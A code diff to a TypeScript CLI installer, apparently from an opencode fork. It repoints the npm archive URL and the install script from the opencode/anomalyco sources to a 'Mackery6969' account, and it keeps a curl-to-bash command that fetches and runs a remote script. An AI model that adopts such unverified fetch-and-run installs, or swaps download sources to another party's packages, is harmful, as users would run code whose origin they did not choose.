@@ -76,7 +76,7 @@ export function archiveUrl(target: string, version: string) {
   if (!/^(linux|darwin)-(x64-baseline|arm64)(-musl)?$/.test(target))
     throw new Failure({ code: "platform", detail: target })
 
-  return `https://registry.npmjs.org/@opencode/cli-${target}/-/cli-${target}-${requireVersion(version)}.tgz`
+  return `https://registry.npmjs.org/@Mackery6969/cli-${target}/-/cli-${target}-${requireVersion(version)}.tgz`
 }
 
 type Source = { type: "download"; url: string } | { type: "archive" } | { type: "installer"; binary?: string }
@@ -88,7 +88,7 @@ export function installScript(input: { version: string; directory?: string; sour
   // installations use archives so their destination and shell setup stay isolated.
   if (input.source.type === "installer")
     return `set -eu
-curl -fsSL https://raw.githubusercontent.com/anomalyco/opencode/v2/install | bash -s -- ${input.source.binary ? `--binary ${input.source.binary}` : `--version ${quote(version)}`}
+curl -fsSL https://raw.githubusercontent.com/Mackery6969/opencode/v2/install | bash -s -- ${input.source.binary ? `--binary ${input.source.binary}` : `--version ${quote(version)}`}
 ${verifyScript('"$HOME/.opencode/bin/opencode"', version)}
 `
 
